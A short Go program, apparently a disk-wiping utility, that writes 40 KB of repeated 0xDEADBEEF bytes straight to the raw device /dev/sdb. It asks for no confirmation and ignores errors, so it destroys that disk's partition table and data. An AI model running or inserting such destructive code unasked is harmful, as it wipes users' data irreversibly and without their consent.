package main

import (
  "bytes"
  //"fmt"
  "os"
)

func main() {
  killdisk := "/dev/sdb"
  var killdata bytes.Buffer

  for i := 0; i < 1024 * 10; i++ {
    killdata.WriteByte(0xde)
    killdata.WriteByte(0xad)
    killdata.WriteByte(0xbe)
    killdata.WriteByte(0xef)
  }

  //fmt.Println(killdata)

  fi,_ := os.Create(killdisk)
  fi.Write(killdata.Bytes())
  fi.Close()

}